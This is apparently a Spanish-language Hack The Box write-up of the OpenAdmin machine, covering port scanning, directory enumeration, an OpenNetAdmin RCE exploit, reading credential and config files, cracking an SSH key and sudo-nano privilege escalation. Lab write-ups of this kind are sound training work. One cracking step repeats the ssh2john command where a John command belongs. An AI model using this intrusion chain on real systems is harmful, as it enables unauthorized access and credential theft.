# HTB - OpenAdmin
Este es mi primer writeup asi como OpenAdmin(10.10.10.171) fue una de las primeras maquinas que resolvi. Espero que sea de ayuda al lector y H4ppy H4ck1ng!
## Escaneando puertos
Utilizando el comando:
```markdown
nmap -sS --open -p- -sV -T 4 10.10.10.171 
```
![imagen](https://user-images.githubusercontent.com/84255799/119300072-c16ead80-bc25-11eb-9a3c-61bf6bc1ea3f.png)

Del escaneo, se puede observar que la maquina tiene 2 puertos abiertos, se requieren usuarios para el login de SSh por lo que se procede a enumerar el puerto 80.

## Enumeración de directorios
Para este paso hice uso de DirBuster, ingrese los datos: URL: http://10.10.10.171:80/ y Wordlist: directory-list-lowercase-2.3-medium.txt.
La herramiento encontro los siguientes directorios:
![imagen](https://user-images.githubusercontent.com/84255799/119300552-8f118000-bc26-11eb-88c8-6c30854b43aa.png)

Probando esos directorios, encontre que el directorio /music tiene un boton de login que me redirecciona a OpenNetAdmin ver 18.1.1. Buscando en google, encontre que esa versión posee RCE(Remote Code Execution).

##Buscando acceso

Procedo a buscar exploits con el siguiente comando:
```markdown
searchsploit opennetadmin
```
![imagen](https://user-images.githubusercontent.com/84255799/119301075-81a8c580-bc27-11eb-8e87-5796ec89ace9.png)

Una vez copiado el exploit en nuestra carpeta de trabajo, debemos darle permisos para ejecución.
![imagen](https://user-images.githubusercontent.com/84255799/119301145-a2711b00-bc27-11eb-9887-94d2063c84bd.png)

Ejecutandolo con:
```markdown
./ona.sh http://10.10.10.171/ona/
```
Me da una shell:
![imagen](https://user-images.githubusercontent.com/84255799/119301280-d0565f80-bc27-11eb-9d99-24f7c772941f.png)

##Buscando credenciales

Procedo a buscar archivos que puedan darme pistas de cómo obtener acceso a un user.
![imagen](https://user-images.githubusercontent.com/84255799/119301374-fe3ba400-bc27-11eb-9979-f1e5ee69c922.png)

Leyendo ese archivo con:
```markdown
cat var/www/ona/local/config/database_settings.inc.php
```
Encontramos lo siguiente
![imagen](https://user-images.githubusercontent.com/84255799/119301592-570b3c80-bc28-11eb-8d91-890f011f8fd4.png)

Por lo que intento probar esa contraseña en los usuarios de la maquina
```markdown
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
jimmy:x:1000:1000:jimmy:/home/jimmy:/bin/bash
joanna:x:1001:1001:,,,:/home/joanna:/bin/bash
```
La contraseña funcionó para Jimmy!
![imagen](https://user-images.githubusercontent.com/84255799/119301787-a2bde600-bc28-11eb-990f-b50693b4f08f.png)

##Escalando privilegios 

Buscando en los directorios de la maquina, encontre uno interesante
```markdown
cat /var/www/internal/main.php
```
![imagen](https://user-images.githubusercontent.com/84255799/119301945-e57fbe00-bc28-11eb-81fa-77a393343e78.png)

Esto me motiva a verificar si se esta utilizando algun otro puerto de forma interna en la maquina
```markdown
ss -ltu
```
![imagen](https://user-images.githubusercontent.com/84255799/119302096-2f68a400-bc29-11eb-96c8-bff28733c843.png)

Por lo que si realizamos Curl a la pagina en ese puerto
```markdown
curl localhost:52846/main.php
```
Encontramos una llave privada
![imagen](https://user-images.githubusercontent.com/84255799/119302205-5a52f800-bc29-11eb-9014-2adb7003b667.png)

###Crackeando password 

Para crackear una pass, mi primera opción es JohnTheRipper, pero antes procedo a ponerla en un formato que el John pueda aceptar
```markdown
sudo python /usr/share/john/ssh2john.py id_rsa > joanna_id_rsa.hash
```

Una vez hecho esto, procedo a crackearla
```markdown
sudo python /usr/share/john/ssh2john.py id_rsa > joanna_id_rsa.hash
```
![imagen](https://user-images.githubusercontent.com/84255799/119302468-c6356080-bc29-11eb-89a7-fcea46d065d1.png)

Cuando probamos esa clave, tenemos el acceso
```markdown
ssh -i id_rsa joanna@10.10.10.171
```
![imagen](https://user-images.githubusercontent.com/84255799/119302614-03015780-bc2a-11eb-8a1e-9ca4c21293e3.png)

Si leemos el user.txt tendremos la flag del user.
![imagen](https://user-images.githubusercontent.com/84255799/119302679-1d3b3580-bc2a-11eb-9364-46da0f308771.png)

###Ultimo paso

Comprobamos que permiso tiene Joanna
```markdown
sudo -l
```
![imagen](https://user-images.githubusercontent.com/84255799/119302790-507dc480-bc2a-11eb-9d61-d31a142d7866.png)

Joanna tiene permiso de ejecutar nano como root.

Por lo tanto,
```markdown
sudo /bin/nano /opt/priv
```
![imagen](https://user-images.githubusercontent.com/84255799/119302929-828f2680-bc2a-11eb-87ce-ae52b53a6321.png)

Para ir directamente a root.txt, busque el archivo y luego procedi a leerlo.
![imagen](https://user-images.githubusercontent.com/84255799/119302975-9aff4100-bc2a-11eb-8614-35dcc25a287d.png)

##Gracias por leer!

Espero te haya servido, proximamente publicaré más writeups.
